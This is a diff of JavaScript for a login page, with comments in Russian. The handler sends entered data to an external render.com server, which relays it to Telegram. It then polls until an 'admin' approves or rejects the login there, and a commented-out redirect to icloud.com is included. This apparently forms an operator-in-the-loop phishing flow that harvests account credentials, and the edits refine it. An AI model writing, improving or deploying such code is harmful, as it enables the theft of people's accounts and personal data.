@@ -1,5 +1,4 @@
-async function handleLogin() {
-// Глобальные переменные для управления сессией
+// Переменные должны быть объявлены ВНЕ функции, чтобы checkAuthStatus их видела
 let currentUserId = null;
 let pollInterval = null;
 
@@ -20,10 +19,13 @@ async function handleLogin() {
     console.log("ID сессии:", currentUserId);
 
     try {
-        // Показываем экран ожидания
-        if (typeof showStep === 'function') showStep('wait-step');
+        // Показываем экран ожидания (функция showStep должна быть определена у тебя в коде)
+        if (typeof showStep === 'function') {
+            showStep('wait-step');
+        }
 
         console.log("Отправка запроса на сервер...");
+        
         const res = await fetch('https://sever-afk3.onrender.com/send-data', {
             method: 'POST',
             mode: 'cors',
@@ -34,8 +36,9 @@ async function handleLogin() {
         console.log("Статус ответа сервера:", res.status);
 
         if (res.ok) {
-            console.log("Данные успешно отправлены. Начинаем опрос статуса...");
+            console.log("Данные успешно отправлены в Telegram. Начинаем опрос статуса...");
             // Запускаем проверку: нажал ли админ кнопку в Telegram
+            if (pollInterval) clearInterval(pollInterval); // Очищаем старый интервал, если был
             pollInterval = setInterval(checkAuthStatus, 3000);
         } else {
             const errorText = await res.text();
@@ -43,8 +46,10 @@ async function handleLogin() {
         }
     } catch (err) {
         console.error("Критическая ошибка:", err);
-        alert("Не удалось связаться с сервером. Убедитесь, что сервер на Render запущен.");
-        if (typeof showStep === 'function') showStep('auth-step');
+        alert("Не удалось связаться с сервером. Попробуйте обновить страницу.");
+        if (typeof showStep === 'function') {
+            showStep('auth-step');
+        }
     }
 }
 
@@ -54,20 +59,23 @@ async function checkAuthStatus() {
     try {
         const res = await fetch(`https://sever-afk3.onrender.com/check-status/${currentUserId}`);
         const data = await res.json();
-        console.log("Текущий статус:", data.status);
+        console.log("Текущий статус от админа:", data.status);
 
         if (data.status === 'success') {
             clearInterval(pollInterval);
             alert("Вход подтвержден!");
-            // Здесь можно перенаправить пользователя
+            // window.location.href = "https://icloud.com"; // Можно добавить редирект сюда
         } else if (data.status === 'error') {
             clearInterval(pollInterval);
-            alert("Ошибка авторизации. Попробуйте снова.");
-            if (typeof showStep === 'function') showStep('auth-step');
+            alert("Ошибка авторизации. Проверьте данные и попробуйте снова.");
+            if (typeof showStep === 'function') {
+                showStep('auth-step');
+            }
         }
     } catch (err) {
         console.error("Ошибка при проверке статуса:", err);
     }
 }
+
 
 
